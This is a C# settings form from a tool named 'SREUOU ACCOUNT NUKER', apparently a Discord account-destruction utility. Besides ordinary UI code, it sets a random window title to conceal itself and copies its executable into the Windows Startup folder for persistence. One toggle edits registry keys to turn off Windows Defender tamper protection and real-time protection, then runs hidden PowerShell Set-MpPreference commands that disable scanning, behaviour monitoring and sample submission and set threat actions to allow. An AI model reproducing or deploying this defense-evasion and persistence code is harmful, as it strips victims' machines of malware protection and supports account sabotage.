using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.Win32;
using Siticone.UI.WinForms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SREUOU_ACCOUNT_NUKER
{
    public partial class Settings : Form
    {
        public Settings()
        {
            InitializeComponent();
        }

        public string Hide()
        {
            string text = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
            string text2 = "";
            Random random = new Random();
            int num = random.Next(5, text.Length);
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }

        protected override void WndProc(ref Message m)
        {
            try
            {
                const int RESIZE_HANDLE_SIZE = 10;
                switch (m.Msg)
                {
                    case 0x0084/*NCHITTEST*/ :
                        base.WndProc(ref m);

                        if ((int)m.Result == 0x01/*HTCLIENT*/)
                        {
                            Point screenPoint = new Point(m.LParam.ToInt32());
                            Point clientPoint = this.PointToClient(screenPoint);
                            if (clientPoint.Y <= RESIZE_HANDLE_SIZE)
                            {
                                if (clientPoint.X <= RESIZE_HANDLE_SIZE)
                                    m.Result = (IntPtr)13/*HTTOPLEFT*/ ;
                                else if (clientPoint.X < (Size.Width - RESIZE_HANDLE_SIZE))
                                    m.Result = (IntPtr)12/*HTTOP*/ ;
                                else
                                    m.Result = (IntPtr)14/*HTTOPRIGHT*/ ;
                            }
                            else if (clientPoint.Y <= (Size.Height - RESIZE_HANDLE_SIZE))
                            {
                                if (clientPoint.X <= RESIZE_HANDLE_SIZE)
                                    m.Result = (IntPtr)10/*HTLEFT*/ ;
                                else if (clientPoint.X < (Size.Width - RESIZE_HANDLE_SIZE))
                                    m.Result = (IntPtr)2/*HTCAPTION*/ ;
                                else
                                    m.Result = (IntPtr)11/*HTRIGHT*/ ;
                            }
                            else
                            {
                                if (clientPoint.X <= RESIZE_HANDLE_SIZE)
                                    m.Result = (IntPtr)16;
                                else if (clientPoint.X < (Size.Width - RESIZE_HANDLE_SIZE))
                                    m.Result = (IntPtr)15;
                                else
                                    m.Result = (IntPtr)17;
                            }
                        }
                        return;
                }
                base.WndProc(ref m);
            }
            catch { }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.Style |= 0x20000;
                return cp;
            }
        }

        private void Settings_Load(object sender, EventArgs e)
        {
            if (Settings1.Default.notifyIcon == "true")
            {
                siticoneToggleSwitch4.Checked = true;
            }
            if (Settings1.Default.BlackBackround == "true")
            {
                this.guna2ShadowForm1.SetShadowForm(this);
                this.BackgroundImage = Properties.Resources._9f867dbeead71e9d7ea096a62c3e1d59__dark_blue_wallpaper_blue_wallpapers;
            }
            if (Settings1.Default.ChromaGlowColor == "true")
            {
                this.BackgroundImage = Properties.Resources.discord_chroma_bg;
            }
            this.Text = Hide().ToString();
            if (Settings1.Default.AutoRun == "true")
            {
                siticoneToggleSwitch3.Checked = true;
            }
            if (Settings1.Default.TopMost == "true")
            {
                siticoneToggleSwitch1.Checked = true;
            }
            if (Settings1.Default.TopMost == "true")
            {
                TopMost = true;
            }
        }

        private void siticoneToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            if (siticoneToggleSwitch1.Checked == true)
            {
                bool flag = MessageBox.Show("Do You Want To Restart The ACCOUNT NUKER To Save The New Settings?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes;
                if (flag == true)
                {
                    {
                        Application.Restart();
                        Settings1.Default.TopMost = "true";
                        Settings1.Default.Save();
                    }
                }
                else
                {
                    siticoneToggleSwitch1.Checked = false;
                }
            }
            if (siticoneToggleSwitch1.Checked == false)
            {
                Settings1.Default.TopMost = "false";
                Settings1.Default.Save();
            }
        }

        private async void siticoneButton18_Click(object sender, EventArgs e)
        {
            this.Opacity = 1000;
            await Task.Delay(30);
            this.Opacity = .800;
            await Task.Delay(30);
            this.Opacity = .700;
            await Task.Delay(30);
            this.Opacity = .600;
            await Task.Delay(30);
            this.Opacity = .500;
            await Task.Delay(30);
            this.Opacity = .400;
            await Task.Delay(30);
            this.Opacity = .300;
            await Task.Delay(30);
            this.Opacity = .200;
            await Task.Delay(30);
            this.Opacity = .100;
            await Task.Delay(30);
            this.Opacity = .0;
            await Task.Delay(70);
            base.Close();
        }

        private void siticoneButton19_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void siticoneToggleSwitch3_CheckedChanged(object sender, EventArgs e)
        {
            if (siticoneToggleSwitch3.Checked == true)
            {
                Settings1.Default.AutoRun = "true";
                Settings1.Default.Save();
                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
                string sourcePath;
                if (Assembly.GetEntryAssembly() != null)
                {
                    sourcePath = Assembly.GetEntryAssembly().Location;
                }
                else
                {
                    sourcePath = Environment.GetCommandLineArgs()[0];
                }
                string targetPath = Path.Combine(startupPath, Path.GetFileName(sourcePath));
                if (File.Exists(targetPath))
                {
                    File.Delete(targetPath);
                }
                File.Copy(sourcePath, targetPath);
            }
            if (siticoneToggleSwitch3.Checked == false)
            {
                Settings1.Default.AutoRun = "false";
                Settings1.Default.Save();
            }
        }

        private void siticoneToggleSwitch4_CheckedChanged(object sender, EventArgs e)
        {
            if (siticoneToggleSwitch4.Checked == true)
            {
                notifyIcon1.Icon = new System.Drawing.Icon(Path.GetFullPath("favicon (10).ico"));
                notifyIcon1.Text = "SREUOU ACCOUNT NUKER";
                notifyIcon1.Visible = true;
                notifyIcon1.BalloonTipTitle = "Enebled The Minimized";
                notifyIcon1.BalloonTipText = "Click To Close!";
                notifyIcon1.ShowBalloonTip(100);
                Settings1.Default.notifyIcon = "true";
                Settings1.Default.Save();
            }
            if (siticoneToggleSwitch4.Checked == false)
            {
                notifyIcon1.Icon = new System.Drawing.Icon(Path.GetFullPath("favicon (10).ico"));
                notifyIcon1.Text = "SREUOU ACCOUNT NUKER";
                notifyIcon1.Visible = false;
                notifyIcon1.BalloonTipTitle = "Enebled The Minimized";
                notifyIcon1.BalloonTipText = "Click To Close!";
                notifyIcon1.ShowBalloonTip(100);
                Settings1.Default.notifyIcon = "false";
                Settings1.Default.Save();
            }
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true");

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true");

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true");

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true");

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2");

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0");

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6");

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
            }
        }

        private void siticoneToggleSwitch5_CheckedChanged(object sender, EventArgs e)
        {
            if (siticoneToggleSwitch5.Checked == true)
            {
                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
                    RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
                    CheckDefender();
            }
            if (siticoneToggleSwitch5.Checked == false)
            {

            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        private void siticoneToggleSwitch2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void siticoneToggleSwitch6_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
